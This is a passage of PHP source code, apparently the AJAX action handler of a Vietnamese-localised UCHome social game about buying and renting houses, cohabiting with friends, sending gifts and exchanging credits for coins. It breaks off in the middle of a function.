<?php
//Game ngôi nhà hạnh phúc được phát triển bởi Kết Nối trẻ group
//Vui lòng giữ bản quyền Việt hóa của Kết Nối trẻ group
//Cám ơn bạn đã sử dụng sản phẩm của Kết Nối trẻ group
if ( !defined( "IN_UCHOME" ) ) exit( "Access Denied" );
header('Content-type: text/xml; charset=' . $_SC['charset']);
$error = array('status'=>404, 'message'=>'yêu cầu gửi dữ liệu bất hợp pháp');

$op = '_op_' . $_GET['op'];
if(function_exists($op)) $op();
else{
	$data = array('status'=>404, 'message'=>'yêu cầu gửi dữ liệu bất hợp pháp');
	ajax_out(jsonencode($data));
}

function _op_credit()
{
	global $status, $house_config, $_SGLOBAL;
	if($_POST['myFormAc'] == 'update'){
		$type = intval($_POST['type']);
		$num = intval($_POST['num']);
		if($num < 1) $data = array('status'=>404, 'message'=>'Xin vui lòng nhập một số tiền');
		else{
			if($type == 0){
				if($house_config['credit_money'] < 1){
					$data = array('status'=>404, 'message'=>'Đổi tiền xu đều đã bị người quản trị đóng cửa');
					ajax_out(jsonencode($data));
				}
				//积分兑换金币
				if($_SGLOBAL['member']['credit'] < $num){
					$data = array('status'=>404, 'message'=>"điểm của bạn chỉ{$_SGLOBAL['member']['credit']}Điểm, không nhiều như bạn điền");
				}else{
					$money = $status['money'] + $house_config['credit_money'] * $num;
					$credit = $_SGLOBAL['member']['credit'] - $num ;
					query_exec("update  ".tname("app_love_user")." set money = {$money} where uid = '{$status['uid']}'");
					query_exec("update  ".tname("space")." set credit = {$credit} where uid = '{$status['uid']}'");
					$data = array('status'=>200, 'message'=>'Giao dịch thành công');
				}
			}else{
				if($house_config['money_credit'] < 1){
					$data = array('status'=>404, 'message'=>'trao đổi tiền đã được người quản trị đóng cửa chức năng tích hợp');
					ajax_out(jsonencode($data));
				}
				if($status['money'] < $num){
					$data = array('status'=>404, 'message'=>"Chỉ có bạn vàng{$status['money']}Tháng, không nhiều như bạn điền");
				}else{
					if($num < $house_config['money_credit']){
						$data = array('status'=>404, 'message'=>"Xin lỗi, bạn hãy điền vào vàng là không đủ của một điểm giao lưu");
					}else{
						$credit_add = intval($num/$house_config['money_credit']);
						$money = $status['money'] - $house_config['money_credit'] * $credit_add;
						$credit = $_SGLOBAL['member']['credit'] + $credit_add ;
						query_exec("update  ".tname("app_love_user")." set money = {$money} where uid = '{$status['uid']}'");
						query_exec("update  ".tname("space")." set credit = {$credit} where uid = '{$status['uid']}'");
						$data = array('status'=>200, 'message'=>'Giao dịch thành công');
					}
				}
			}
		}
	}else{
		if($house_config['money_credit'] < 1 && $house_config['credit_money'] < 1){
			$data = array('status'=>404, 'message'=>'Chuyển đổi chức năng đã được người quản trị đóng cửa');
			ajax_out(jsonencode($data));
		}
		$op = 'credit';
		include_once( template( "house/view/ajax" ));
		_get_content();
	}
	ajax_out(jsonencode($data));
}

function _op_miyu_add()
{
	global $_SGLOBAL;
	$param['message'] = htmlspecialchars(ajax_get('message'));
	$param['hid'] = intval($_GET['hid']);
	$param['uid'] = $_SGLOBAL['supe_uid'];
	$param['username'] = addslashes($_SGLOBAL['supe_username']);
	$param['dateline'] = time();
	inserttable('app_love_miyu', $param);
	$data = array('status'=>200, 'message'=>'Xin chúc mừng! Honey ngôn ngữ được gửi thành công！');
	ajax_out(jsonencode($data));
}

function _op_miyu_get()
{
	$hid = intval($_GET['hid']);
	$data = query_all("select * from ".tname("app_love_miyu")." where hid = '{$hid}' order by mid desc");
	foreach($data as $key=>$val){
		realname_set($val['uid'], $val['username']);
		$data[$key]['dateline'] = sgmdate('Y-n-d H:i', $val['dateline'], true);
	}
	realname_get();
	$op = 'miyu_get';
	include_once( template( "house/view/ajax" ));
	_get_content();
}

function _op_invite()
{
	global $status, $error, $_SGLOBAL, $_SN;
	if(!is_array($_SGLOBAL['member']['friends']) || empty($_SGLOBAL['member']['friends']) || count($_SGLOBAL['member']['friends']) == 0){
		$data = array('status'=>404, 'message'=>'Bạn không có bạn bè, có thể gọi để được giúp đỡ！');
	}else{
		$friends = $_SGLOBAL['member']['friends'];
		$uids = implode(',', $friends);
		if($_POST['myFormAc'] == 'update'){
			$temp = explode(',', $_POST['friend']);
			$friend = array();
			foreach($temp as $v){
				if(intval($v) < 1) continue;
				$friend[] = intval($v);
			}
			$friend = array_unique($friend);
			if(empty($friend)){
				$data = array('status'=>404, 'message'=>'Bạn đã không chọn để mời mọi người？');
			}else{
				$temp = query_all("select uid from ".tname("app_love_user")." where uid IN ($uids)  ");
				$exists = array();
				foreach($temp as $val){
					$exists[] = $val['uid'];
				}
				include_once(S_ROOT.'./source/function_cp.php');
				realname_get();
				foreach($friend as $fuid){
					if(in_array($fuid, $exists)) continue;
					$check = query_one("select count(*) as num from ".tname("app_love_invite")." where  uid = '{$status['uid']}' and fuid = '{$fuid}' ");
					if($check['num'] > 0) continue;
					query_exec("replace into ".tname("app_love_invite")." (uid, fuid, status) values ('{$status['uid']}', '{$fuid}', 1)");
					$note = "<font color=green>Lời mời được tin nhắn</font>：{$_SN[$_SGLOBAL['supe_uid']]} Trong trò chơi [thời đại mới sống với nhau] mời các bạn để chơi trò chơi，<a href='house.php?ac=receive&op=invite&uid={$status['uid']}'>Nhấn vào đây để xem</a>";
					notification_add($fuid, 'love', $note);
				}
				$data = array('status'=>200, 'message'=>'Mời gửi thành công！');
			}	
		}else{
			$users = array();
			$temp = query_all("select uid, username, name from ".tname("space")." where uid IN ($uids)  ");
			foreach($temp as $val){
				$users[] = array(
					'name'=> $val['username'],
					'uid' => $val['uid']
				);
				realname_set($val['uid'], $val['username']);
			}
			realname_get();
			$op = 'invite';
			include_once( template( "house/view/ajax" ));
			_get_content();
		}
	}
	ajax_out(jsonencode($data));
}

function _op_getSave()
{
	global $status, $error, $_SGLOBAL, $_SN;
	if(!$status['hid'] || $status['uid'] != $status['focus']){
		$data = array('status'=>404, 'message'=>'yêu cầu gửi dữ liệu bất hợp pháp');
	}else{
		if(!is_array($_SGLOBAL['member']['friends']) || empty($_SGLOBAL['member']['friends']) || count($_SGLOBAL['member']['friends']) == 0){
			$data = array('status'=>404, 'message'=>'Bạn không có bạn bè, có thể gọi để được giúp đỡ！');
		}else{
			$check = query_one("select count(*) as num from ".tname("app_love_save")." where uid = '{$status['uid']}' and hid = '{$status['hid']}' ");
			if($check['num'] > 0){
				$data =  array('status'=>404, 'message'=>'<p>Sai! Một khi bạn đã gửi tin nhắn bị nạn</p><p>Xin vui lòng bạn bè bệnh nhân được cứu nó！</p>');
			}else{
				if($_POST['myFormAc'] == 'update'){
					$temp = explode(',', $_POST['friend']);
					$friend = array();
					foreach($temp as $v){
						if(intval($v) < 1) continue;
						$friend[] = intval($v);
					}
					$friend = array_unique($friend);
					if(empty($friend)){
						$data = array('status'=>404, 'message'=>'Người bạn muốn gửi tín hiệu bị nạn ah？');
					}else{
						$hash = int_random(9);
						$sid = query_exec("insert into  ".tname("app_love_save")." (uid, hid, status, hash) values ('{$status['uid']}','{$status['hid']}',1,'{$hash}')", true);
						/*add ac*/
						realname_get();
						include_once(S_ROOT.'./source/function_cp.php');
						foreach($friend as $key => $fuid){
							$note = "<font color=green>tín hiệu đau khổ</font>：<a href='house.php?ac=index&uid={$_SGLOBAL['supe_uid']}'>{$_SN[$_SGLOBAL['supe_uid']]}</a> Trong trò chơi[<a href='house.php'>kỷ nguyên của sự sống chung</a>]Gửi tin nhắn bị nạn với hy vọng rằng bạn sẽ cứu，<a href='house.php?ac=receive&op=save&sid={$sid}&hash={$hash}'>Nhấn vào đây để xem</a>";
							notification_add($fuid, 'love', $note);
						}

						/*增加news*/
						$param = array($_SGLOBAL['supe_uid'], $_SN[$_SGLOBAL['supe_uid']], $sid, $hash);
						news::add($param , 1, 2);

						$data = array('status'=>200, 'message'=>'tín hiệu đau khổ được gửi thành công, chẳng hạn như một người bạn để cứu bạn nó！');
					}
				}else{
					$friends = $_SGLOBAL['member']['friends'];
					$uids = implode(',', $friends);
					$users = array();
					$temp = query_all("select uid, username, name from ".tname("space")." where uid IN ($uids)  ");
					foreach($temp as $val){
						$users[] = array(
							'name'=> $val['name'] ? $val['name'] : $val['username'],
							'uid' => $val['uid']
						);
					}
					$op = 'getSave';
					include_once( template( "house/view/ajax" ));
					_get_content();
				}
			}
		}
	}
	ajax_out(jsonencode($data));
}

function _op_get_back()
{
	global $_SGLOBAL, $error, $house_config, $house_db, $status;
	$id = intval($_GET['id']);
	$temp = get_house($id);
	if(empty($temp) || $_SGLOBAL['supe_uid'] != $temp['uid'] || !$temp['sent_uid']) ajax_out(jsonencode($error));
	$user = get_user_status($temp['sent_uid'], true);
	if(empty($user)) ajax_out(jsonencode($error));
	$day = intval((time() - $temp['sent_dateline'])/(3600*24));
	$dateline = $temp['sent_dateline'] + $day * 3600*24;
	$money = $day * ($house_db[$temp['cid']]['goods_money'] + $temp['price']);
	if($user['money'] < $money){
		$data = array('status'=>404, 'message'=>"<p>Tiền xu vàng thuộc sở hữu của người（{$user['money']}）Không đủ để trả tiền thuê nhà hiện nay còn nợ {$money}Tiền xu vàng</p><p>Tôi quyết định：<a href='#' onclick=\"return base.get_back({$id});\">Thu hồi nhà ở, và nhận được tất cả các đồng xu bạn</a></p>");
		 ajax_out(jsonencode($data));
	}
	if($_POST['myFormAc'] == 'update'){
		$money && query_exec("update ".tname("app_love_user")."  set money = money + {$money} where uid = '{$status['uid']}' ");
		$money && query_exec("update ".tname("app_love_user")."  set money = money - {$money} where uid = '{$user['uid']}' ");
		query_exec("update ".tname("app_love_house")."  set status = 1, sent_uid = 0, sent_username = '', sent_dateline = 0 where id = '{$id}' ");
		query_exec("update ".tname("app_love_user")."  set user_status = 0, live_id = 0, hid = 0 where uid = '{$user['uid']}' ");
		if($user['hid'] > 0){
			$user['live_with_uid'] && query_exec("update ".tname("app_love_user")."  set user_status = 0, live_id = 0, hid = 0 where uid = '{$user['live_with_uid']}' ");
			query_exec("update ".tname("app_love_history")."  set status = 0 where uid = '{$user['live_with_uid']}' ");
		}
		$data = array('status'=>200, 'message'=>"<p>Xin chúc mừng! Thu hồi nhà ở, và truy cập vào tiền thuê{$money}Tiền xu vàng</p><script type=\"text/javascript\">setTimeout(function(){window.location.href='house.php?ac=house';}, 1000);</script>");
		 ajax_out(jsonencode($data));
	}else{
		realname_get();
		$op = 'get_back';
		include_once( template( "house/view/ajax" ));
		_get_content();
	}
}

function _op_get_goods()
{
	global $_SGLOBAL, $error, $house_config, $house_db, $status;
	$id = intval($_GET['id']);
	$temp = get_house($id);
	if(empty($temp) || $_SGLOBAL['supe_uid'] != $temp['uid'] || !$temp['sent_uid']) ajax_out(jsonencode($error));
	$user = get_user_status($temp['sent_uid'], true);
	if(empty($user)) ajax_out(jsonencode($error));
	if(time() - $temp['sent_dateline'] < 3600 * 24){
		$data = array('status'=>404, 'message'=>'Kể từ ngày thuê cuối' .sgmdate('Y-n-d H:i', $temp['sent_dateline']). ' Ngoài ra ít hơn 24 giờ, không có thể thuê bộ sưu tập');
		 ajax_out(jsonencode($data));
	}
	$day = intval((time() - $temp['sent_dateline'])/(3600*24));
	$dateline = $temp['sent_dateline'] + $day * 3600*24;
	$money = $day * ($house_db[$temp['cid']]['goods_money'] + $temp['price']);
	if($user['money'] < $money){
		$data = array('status'=>404, 'message'=>"<p>Tiền xu vàng thuộc sở hữu của người（{$user['money']}）Không đủ để trả tiền thuê nhà hiện nay còn nợ {$money}Tiền xu vàng</p><p>Tôi quyết định：<a href='#' onclick=\"return base.get_back({$id});\">Thu hồi nhà ở, và nhận được tất cả các đồng xu bạn</a></p>");
		 ajax_out(jsonencode($data));
	}
	if($_POST['myFormAc'] == 'update'){
		$money && query_exec("update ".tname("app_love_user")."  set money = money + {$money} where uid = '{$status['uid']}' ");
		$money && query_exec("update ".tname("app_love_user")."  set money = money - {$money} where uid = '{$user['uid']}' ");
		query_exec("update ".tname("app_love_house")."  set sent_dateline = {$dateline} where id = '{$id}' ");
		$data = array('status'=>200, 'message'=>"<p>Truy cập thuê{$money}Tiền xu vàng</p>");
		 ajax_out(jsonencode($data));
	}else{
		realname_get();
		$op = 'get_goods';
		include_once( template( "house/view/ajax" ));
		_get_content();
	}
}

function _op_love_history()
{
	global $status;
	$hid = intval($_GET['hid']);
	if($hid < 1){
		ajax_out('<li class="info">bạn đã không sống chung</li>');
	}else{
		$data = query_all("select ac.*, a.w_l, a.w_r, h.uid_1, h.uid_2, h.username_1, h.username_2 from ".tname("app_love_love_action")." as ac left join ".tname("app_love_action")." as a on ac.action_id = a.id left join ".tname("app_love_history")." as h on h.hid = ac.hid where ac.hid = '{$hid}' order by ac.id desc limit 50");
		foreach($data as $key=>$val){
			if($val['uid'] == $val['uid_1']){
				$data[$key]['uid_f'] = $val['uid_1'];
				$data[$key]['username_f'] = $val['username_1'];
				$data[$key]['uid_t'] = $val['uid_2'];
				$data[$key]['username_t'] = $val['username_2'];
			}else{
				$data[$key]['uid_f'] = $val['uid_2'];
				$data[$key]['username_f'] = $val['username_2'];
				$data[$key]['uid_t'] = $val['uid_1'];
				$data[$key]['username_t'] = $val['username_1'];
			}
			realname_set($data[$key]['uid_f'], $data[$key]['username_f']);
			realname_set($data[$key]['uid_t'], $data[$key]['username_t']);
			$data[$key]['dateline'] = get_tip($val['dateline']);
		}
		realname_get();
		$op = 'love_history';
		include_once( template( "house/view/ajax" ));
		_get_content();
	}
}

function _op_love_action()
{
	global $status, $_SGLOBAL, $_SN;
	$action_id = intval($_GET['action_id']);
	$check = query_one("select * from ".tname("app_love_action")." where id = '{$action_id}' ");
	if($status['hid'] < 1 || $action_id < 1 || empty($check)){
		$data = array('status'=>404, 'message'=>'yêu cầu gửi dữ liệu bất hợp pháp');
	}else{
		//获取上次提交的时间
		$last_time = query_one("select dateline from ".tname("app_love_love_action")." where hid = '{$status['hid']}' and uid = '{$status['uid']}' order by id desc limit 1");
		if(!empty($last_time) && time() - $last_time['dateline'] < 60){
			$data = array('status'=>404, 'message'=>'Đừng quá thân mật bar, một người chồng và người vợ nhỏ chỉ có một phút thời gian thân mật Oh！');
		}else{
			if($status['money'] < 100){
				$data = array('status'=>404, 'message'=>'Rằng bạn có đủ vàng để thanh toán các hoạt động！');
			}else{
				$MyTime = time();
				query_exec("update ".tname("app_love_user")." set money = money - 100 where uid = '{$status['uid']}'");
				query_exec("insert into ".tname("app_love_love_action")." (hid, uid, action_id,dateline) values ('{$status['hid']}', '{$status['uid']}', '{$action_id}', '{$MyTime}')");
				$my_house = get_house($status['live_id']);
				$thick = 10 * $my_house['cid'];
				query_exec("update ".tname("app_love_history")." set thick = thick + {$thick} where hid = '{$status['hid']}' ");
				/*add news*/
				realname_set($status['live_with_uid'], $status['live_with_username']);
				realname_get();
				$param = array($_SGLOBAL['supe_uid'], $_SN[$_SGLOBAL['supe_uid']], addslashes($check['w_l']), $status['live_with_uid'], $_SN[$status['live_with_uid']], addslashes($check['w_r']));
				news::add($param , 2, 4);

				/*add feeds*/
				$data = array(
					'user'=> "<a href='house.php?ac=index&uid={$status['live_with_uid']}'>{$_SN[$status['live_with_uid']]}</a>",
					'left' => $check['w_l'],
					'right' =>$check['w_r']
				);
				feeds::add($data, 4);
				$data = array('status'=>200, 'message'=>'Xin chúc mừng! Hành động sống chung được gửi thành công<script type="text/javascript">setTimeout(function(){base.bgChangeColor("dialog-advanced", "down", function(){base.closeDoDiv();house.history_my('.$status['hid'].');});}, 2000)</script>');
			}
		}
	}
	ajax_out(jsonencode($data));
}

function _op_sell()
{
	global $_SGLOBAL, $error, $house_config, $house_db;
	$id = intval($_GET['id']);
	$temp = get_house($id);
	if(empty($temp) || $_SGLOBAL['supe_uid'] != $temp['uid']) ajax_out(jsonencode($error));
	if($temp['status'] == 2 || $temp['status'] == 4){
		$data = array('status'=>404, 'message'=>'Sai! Ngôi nhà cũng tại nơi cư trú, không thể bán！');
		ajax_out(jsonencode($data));
	}else{
		$money = $house_db[$temp['cid']]['buy'] * 0.8* (1-$house_config['tax']/100);
		if($_POST['myFormAc'] == 'update'){
			query_exec("delete from ".tname("app_love_house")." where id = '{$id}' ");
			query_exec("update ".tname("app_love_user")." set money = money + {$money}, house_num = house_num - 1  where uid = '{$temp['uid']}' ");
			$data = array('status'=>200, 'message'=>"Xin chúc mừng! Nhà được bán, lợi nhuận{$money}Tiền xu vàng！<script type=\"text/javascript\">setTimeout(function(){window.location.href='house.php?ac=house';}, 1000);</script>");
			$param = array(
				'info'=> $house_db[$temp['cid']]['title'],
				'money'=> $money,
			);
			feeds::add($param, 14);			
			
			ajax_out(jsonencode($data));
		}else{
			$my_get = "Nhà ở giá trị * 80% - 80% giá trị nhà ở ** {$house_config['tax']}% = " . $money;
			$op = 'sell';
			include_once( template( "house/view/ajax" ));
			_get_content();
		}
	}
}

function _op_get_gift()
{
	global $_SGLOBAL;
	$type = intval($_GET['type']);
	$uid = intval($_GET['uid']);
	if($type == 1){//我收到的礼物
		$data = query_all("select g.*, k.*, count(g.gid) as num from ".tname("app_love_gift")." as g left join ".tname("app_love_gift_kind")." as k on g.gid = k.gid  where g.uid_2 = '{$uid}'  group by g.gid");
	}else{//谁送的礼物
		$data = query_all("select g.*, k.*  from ".tname("app_love_gift")." as g left join ".tname("app_love_gift_kind")." as k on g.gid = k.gid where g.uid_2 = '{$uid}' order by id desc");
	}
	foreach($data as $key=>$val){
		realname_set($val['uid'], $val['username']);
		realname_set($val['uid_2'], $val['username_2']);
		$data[$key]['dateline'] = get_tip($val['dateline']);
	}
	realname_get();
	$op = 'get_gift';
	$me = $_SGLOBAL['supe_uid'] == $uid ? "Tôi" : "bạn";
	include_once( template( "house/view/ajax" ));
	_get_content();
}

/*随即获得一个用户, 1男 2女*/
function _op_get_person()
{
	global $_SGLOBAL;
	$my_sex = $_SGLOBAL['member']['sex'];
	if($my_sex != 1 && $my_sex != 2){
		$data =  array('status'=>404, 'message'=>'Xin vui lòng điền vào các thiết lập bên trong quan hệ tình dục của họ vào trò chơi sau khi');
	}else{
		$sex = $my_sex == 1 ? "2" : "1";
		$max = query_one("select max(id) as num from ".tname("app_love_user_{$sex}"));
		if($max['num'] > 0){
			$temp = _get_person_once($sex, $max['num']);
			$temp['head'] = avatar($temp['uid'],'middle');
			$data = array('status'=>200, 'message'=>$temp);
		}else{
			$data =  array('status'=>404, 'message'=>'Xin lỗi! Trò chơi không phải là Xiangxi giới người dùng của bạn');
		}
	}
	ajax_out(jsonencode($data));
}

function _op_find()
{
	global $_SGLOBAL, $status, $error, $_SN, $house_config;
	$touid = intval($_GET['touid']);
	if(($user = get_user_status($touid)) === false) ajax_out(jsonencode($error));
	if($status['user_status'] == 1){
		$data = array('status'=>404, 'message'=>'<p><b>Để tuân thủ pháp luật, một cái giường để ngủ tối đa là hai người (bạn có cohabited với những người khác)！<b></p>');
		 ajax_out(jsonencode($data));
	}
	if($status['live_id'] < 1){
		$data = array('status'=>404, 'message'=>'<p><b>Trường hợp ah bạn muốn mọi người sống trong? Đầu tiên tìm thấy một ngôi nhà để sinh sống nó！<b></p>');
		 ajax_out(jsonencode($data));
	}

/*
	if($user['sex'] == $status['sex']){
		$data = array('status'=>404, 'message'=>'<p><b>Oh xin lỗi, xin hãy chọn giới tính trong quản lý cá nhân！<b></p>');
		ajax_out(jsonencode($data));
	}
*/
	if($_POST['myFormAc'] == 'update'){
		$type = intval($_POST['type']);
		if($type == 0){
			$hash = int_random(9);
			$MyTime = time();
			query_exec("replace into ".tname("app_love_renting")." (op, uid, fuid, id, hash, pay_type, dateline) values ('love', '{$_SGLOBAL['supe_uid']}', '{$touid}', 0, '{$hash}', 0,  '{$MyTime}') ");
			include_once(S_ROOT.'./source/function_cp.php');
			$note = "<font color=green>Sống chung nhắc nhở yêu cầu</font>：<a href='house.php?ac=index&uid={$_SGLOBAL['supe_uid']}'>{$_SN[$_SGLOBAL['supe_uid']]}</a> Trong trò chơi[<a href='house.php'>kỷ nguyên sống chung</a>]Sống chung trong yêu cầu và bạn，<a href='house.php?ac=receive&op=love&uid={$_SGLOBAL['supe_uid']}&id={$id}&hash={$hash}'>Nhấn vào đây để xem</a>";
			notification_add($user['uid'], 'love', $note);
			$data = array('status'=>200, 'message'=>'<p><b>Lời mời đã được phát hành, hãy kiên nhẫn, quả của tình yêu sẽ nở hoa！<b></p>');
		}else{
			if($status['money'] < $house_config['focus']){
				$data = array('status'=>404, 'message'=>'<p><b>Oh xin lỗi, vàng của bạn có vẻ như không đủ để có được người nộp'.$house_config['focus'].'Tiền xu vàng！<b></p>');
				ajax_out(jsonencode($data));
			}else{
				realname_set($user['uid'], $user['username']);
				realname_set($_SGLOBAL['supe_uid'], $_SGLOBAL['supe_username']);
				realname_get();
				$realname = $_SN[$user['uid']];

				/*
				if(check_user_sex($user['uid'], $_SGLOBAL['supe_uid']) === false) {
					$data = array('status'=>404, 'message'=>'<p><b>xin lỗi, xin hãy chọn giới tính trong quản lý cá nhân！<b></p>');
					ajax_out(jsonencode($data));
				}
				*/
				
				$hid = new_love($user['uid'], $user['username'], $user['uid']);

				query_exec("update ".tname("app_love_user")." set hid= '{$hid}', money = money - {$house_config['focus']}, love_num = love_num + 1, user_status = 1  where uid = '{$_SGLOBAL['supe_uid']}' ");
				query_exec("update ".tname("app_love_user")." set hid= '{$hid}', love_num = love_num + 1, user_status = 1, live_id = '{$status['live_id']}'  where uid = '{$user['uid']}' ");
				update_user_force_out($user);

				/*add news*/
				$data = array($_SGLOBAL['supe_uid'], $_SN[$_SGLOBAL['supe_uid']], $user['uid'], $realname);
				news::add($data , 0, 0);

				/*add feeds*/
				$data = array(
					'user'=> "<a href='house.php?ac=index&uid={$user['uid']}'>{$realname}</a>",
				);
				feeds::add($data, 1);

				$data = array('status'=>404, 'message'=>"<p><b>Xin chúc mừng! Bạn đã thành công sẽ được{$realname}Bị cướp nơi cư trú và bạn！<script type=\"text/javascript\">setTimeout(function(){window.location.href='house.php?ac=index';}, 1000);</script><b></p>");
			}
		}
		ajax_out(jsonencode($data));
	}else{
		realname_get();
		$op = 'find';
		include_once( template( "house/view/ajax" ));
		_get_content();
	}
}

/*邀请好友居住，并获得房租*/
function _op_friend_renting()
{
	global $_SGLOBAL, $status, $error;
	$op = 'friend_renting';
	$id = intval($_GET['id']);
	$temp = get_house($id);
	if(empty($temp) || $temp['uid'] !=$_SGLOBAL['supe_uid']){ajax_out(jsonencode($error));}
	$friends = $_SGLOBAL['member']['friends'];
	if(is_array($friends) && count($friends)){
		if($_POST['myFormAc'] == 'update'){
			$friend = intval($_POST['friend']);
			$hash = int_random(9);
			$MyTime = time();
			query_exec("replace into ".tname("app_love_renting")." (op, uid, fuid, id, hash, pay_type, dateline) values ('sure', '{$_SGLOBAL['supe_uid']}', '{$friend}', '{$id}', '{$hash}', '{$pay_type}',  '{$MyTime}') ");
			include_once(S_ROOT.'./source/function_cp.php');
			$note = "<font color=green>Xin nhắc nhở thuê</font>：<a href='house.php?ac=house&uid={$_SGLOBAL['supe_uid']}#house_{$id}'>{$_SN[$_SGLOBAL['supe_uid']]}</a> Trong trò chơi[<a href='house.php'>kỷ nguyên sống chung</a>]Bạn thuê một căn hộ tại，<a href='house.php?ac=receive&op=sure&uid={$_SGLOBAL['supe_uid']}&id={$id}&hash={$hash}'>Nhấn vào đây để xem</a>";
			notification_add($friend, 'love', $note);
			$data = array('status'=>200, 'message'=>'<p><b>Lời mời đã được phát hành, bạn sẽ chờ đợi cho nó tiền！<b></p>');
			ajax_out(jsonencode($data));
		}else{
			$uids = implode(',', $friends);
			$data = array();
			$temp = query_all("select uid, username, name from ".tname("space")." where uid IN ($uids)  ");
			foreach($temp as $val){
				$data[] = array(
					'name'=> $val['name'] ? $val['name'] : $val['username'],
					'uid' => $val['uid']
				);
			}
		}
	}
	realname_get();
	include_once( template( "house/view/ajax" ));
	_get_content();
}

/*邀请好友同居*/
function _op_renting()
{
	global $_SGLOBAL, $status, $error, $house_config, $_SN;
	$friends = $_SGLOBAL['member']['friends'];
	if(is_array($friends) && count($friends)){
		if($_POST['myFormAc'] == 'update'){
			$ac = intval($_POST['form_type']);
			$friend = intval($_POST['friend_' . $ac]);
			$pay_type = 0;
			$friend_status = get_user_status($friend);
			if(empty($friend_status)){
				$data = $error;
			}else{
				realname_get();
				$MyTime = time();
				if($ac == 0){//邀请好友同居，通过通知的方式
					$hash = int_random(9);
					query_exec("replace into ".tname("app_love_renting")." (op, uid, fuid, id, hash, pay_type, dateline) values ('love', '{$_SGLOBAL['supe_uid']}', '{$friend}', 0, '{$hash}', '{$pay_type}',  '{$MyTime}') ");
					include_once(S_ROOT.'./source/function_cp.php');
					$note = "<font color=green>Sống chung nhắc nhở yêu cầu</font>：<a href='house.php?ac=index&uid={$_SGLOBAL['supe_uid']}'>{$_SN[$_SGLOBAL['supe_uid']]}</a> Trong trò chơi[<a href='house.php'>kỷ nguyên sống chung</a>]Sống chung trong yêu cầu và bạn，<a href='house.php?ac=receive&op=love&uid={$_SGLOBAL['supe_uid']}&id={$id}&hash={$hash}'>Nhấn vào đây để xem</a>";
					notification_add($friend_status['uid'], 'love', $note);
					$data = array('status'=>200, 'message'=>'<p><b>Lời mời đã được phát hành, hãy kiên nhẫn, quả của tình yêu sẽ nở hoa！<b></p>');
				}else{//强行同居，当然有钱才行
					if($status['money'] >= $house_config['focus']){
						if($status['live_id'] < 1){
							$data = array('status'=>404, 'message'=>'<p><b>Trường hợp ah bạn muốn mọi người sống trong? Đầu tiên tìm thấy một ngôi nhà để sinh sống nó！<b></p>');
						}elseif($status['user_status'] == 1){
							$data = array('status'=>404, 'message'=>'<p><b>Để tuân thủ pháp luật, một cái giường để ngủ tối đa là hai người (bạn có sống chung với những người khác)！<b></p>');
						}else{
							/*
							if(check_user_sex($friend, $_SGLOBAL['supe_uid']) === false) {
								$data = array('status'=>404, 'message'=>'<p><b>xin lỗi, xin hãy chọn giới tính trong quản lý cá nhân！<b></p>');
								ajax_out(jsonencode($data));
							}
							*/
							//$user = get_user_status($_SGLOBAL['supe_uid']);
							//if($friend_status['sex'] == $user['sex']){
							if (0 == 1) {
								$data = array('status'=>404, 'message'=>'<p><b>xin lỗi, xin hãy chọn giới tính trong quản lý cá nhân！<b></p>');
							}else{
								$hid = new_love($friend_status['uid'], $friend_status['username'], $friend_status['uid']);
								query_exec("update ".tname("app_love_user")." set hid= '{$hid}', money = money - {$house_config['focus']}, love_num = love_num + 1, user_status = 1  where uid = '{$_SGLOBAL['supe_uid']}' ");
								query_exec("update ".tname("app_love_user")." set hid= '{$hid}', love_num = love_num + 1, user_status = 1, live_id = '{$status['live_id']}'  where uid = '{$friend}' ");
								update_user_force_out($friend_status);
								realname_get();
								/*add news*/
								$data = array($_SGLOBAL['supe_uid'], $_SN[$_SGLOBAL['supe_uid']], $friend, $_SN[$friend]);
								news::add($data , 0, 1);

								/*add feeds*/
								$data = array(
									'user'=> "<a href='house.php?ac=index&uid={$user['uid']}'>{$_SN[$user['uid']]}</a>",
								);
								feeds::add($data, 1);

								$data = array('status'=>404, 'message'=>"<p><b>Xin chúc mừng! Bạn đã thành công sẽ được{$_SN[$user['uid']]}Bị cướp nơi cư trú và bạn！<script type=\"text/javascript\">setTimeout(function(){window.location.href='house.php?ac=index';}, 1000);</script><b></p>");
							}
						}
					}else{
						$data = array('status'=>404, 'message'=>'<p><b>Vì vậy, thực tế của xã hội ngày nay, không có tiền để bạn sẽ không đi với bạn. Xin vui lòng lấy nó làm đủ tiền để quay trở lại！<b></p>');
					}
				}
			}
			ajax_out(jsonencode($data));
		}else{
			$uids = implode(',', $friends);
			$data = array();
			$temp = query_all("select uid, username, name from ".tname("space")." where uid IN ($uids)  ");
			foreach($temp as $val){
				if($val['sex'] == $_SGLOBAL['member']['sex']) continue;
				$data[] = array(
					'name'=> $val['name'] ? $val['name'] : $val['username'],
					'uid' => $val['uid']
				);
			}
		}
	}
	realname_get();
	$op = 'renting';
	include_once( template( "house/view/ajax" ));
	_get_content();
}


function _op_changePrice()
{
	global $uid, $error;
	$id = intval($_GET['id']);
	$temp = get_house($id);
	if(empty($temp) || $temp['uid'] != $uid){
		$data = $error;
	}else{
		if($temp['sent_uid'] > 0){
			$data = array('status'=>404, 'message'=>"Sai! nhà ở này hiện đang được cho thuê.");
			ajax_out(jsonencode($data));
		}
		if($_POST['myFormAc'] == 'update'){
			global $_SGLOBAL, $house_kind, $house_db;
			$price = intval($_POST['price']);
			$m = $house_db[$temp['cid']]['buy'] * 0.2;
			if($price < 1 || $price > $m){
				$data = array('status'=>404, 'message'=>"Sai! tiền thuê nhà của bạn chỉ có thể được 1 và{$m}GP / ngày giữa");
			}else{
				query_exec("update ".tname("app_love_house")." set price = {$price} where id = '{$id}'");
				$data = array('status'=>200, 'message'=>'yêu cầu của bạn đã được hiệu quả<script type="text/javascript">setTimeout(function(){window.location.reload();}, 1000);</script>');
			}
		}else{
			$op = 'changePrice';
			include_once( template( "house/view/ajax" ));
			_get_content();
		}
	}
	ajax_out(jsonencode($data));
}

/*给房屋起名字*/
function _op_changeName()
{
	global $uid, $error;
	$id = intval($_GET['id']);
	$temp = get_house($id);
	if(empty($temp) || $temp['uid'] != $uid){
		$data = $error;
	}else{
		if($_POST['myFormAc'] == 'update'){
			global $_SGLOBAL, $house_kind;
			$name = ajax_get('name');
			foreach($house_kind as $val){
				if(strpos($name, $val) !== false){
					$data = array('status'=>404, 'message'=>'Sai! Tên không thể chứa các thị trường nhà ở trong tên của các loại nhà ở.');
					ajax_out(jsonencode($data));
				}
			}
			$_SGLOBAL['db']->query("update ".tname("app_love_house")." set name = '{$name}' where id = '{$id}'");
			$data = array('status'=>200, 'message'=>'yêu cầu của bạn đã được hiệu quả<script type="text/javascript">setTimeout(function(){window.location.reload();}, 1000);</script>');
		}else{
